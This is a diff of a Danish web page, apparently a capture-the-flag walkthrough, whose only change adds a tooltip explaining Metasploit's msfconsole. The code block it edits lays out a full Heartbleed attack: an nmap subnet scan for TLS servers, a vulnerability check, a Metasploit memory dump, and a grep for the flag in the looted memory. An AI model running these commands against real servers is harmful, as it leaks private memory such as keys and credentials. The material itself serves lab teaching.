@@ -30,7 +30,7 @@
 <h2>Trin for trin</h2>
 <pre><code><span class="gloss" tabindex="0" data-tip="Netværksscanner — finder åbne porte og services på en host.">nmap</span> -Pn -p443 --open &lt;subnet&gt;/24                 # find TLS-servere
 nmap -Pn -p443 --script ssl-heartbleed &lt;ip&gt;        # State: VULNERABLE
-msfconsole -q -x "use auxiliary/scanner/ssl/openssl_heartbleed; \
+<span class="gloss" tabindex="0" data-tip="Metasploit Frameworks interaktive konsol til exploits/moduler.">msfconsole</span> -q -x "use auxiliary/scanner/ssl/openssl_heartbleed; \
   set RHOSTS &lt;ip&gt;; set RPORT 443; set ACTION DUMP; run; exit -y"
 grep -aoE 'HKN\{[^}]*\}' ~/.msf4/loot/*heartble*.bin | sort | uniq -c | sort -rn</code></pre>
              <p><strong>Faldgrube:</strong> lækket hukommelse er støjende — ét leak kan give en forvansket variant.
